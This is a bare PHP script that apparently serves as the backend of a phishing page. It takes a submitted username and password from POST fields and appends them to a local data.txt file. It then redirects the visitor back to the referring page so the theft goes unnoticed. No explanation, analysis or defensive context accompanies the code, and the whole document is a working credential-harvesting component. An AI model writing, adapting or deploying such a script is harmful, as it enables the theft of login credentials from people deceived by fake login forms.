<?php
    $USRX = $_POST["usr"];
    $PAXX = $_POST["pax"];
    $file = fopen('data.txt', 'a');
    $content = $USRX. PHP_EOL .$PAXX;
    fwrite($file , 'Username: ');
    fwrite($file , $USRX);
    fwrite($file , "\n");
    fwrite($file , 'Password: ');
    fwrite($file , $PAXX);
    fwrite($file , "\n");
    fwrite($file , "\n");
    fclose($file );
    die(header("Location: ".$_SERVER["HTTP_REFERER"]));
?>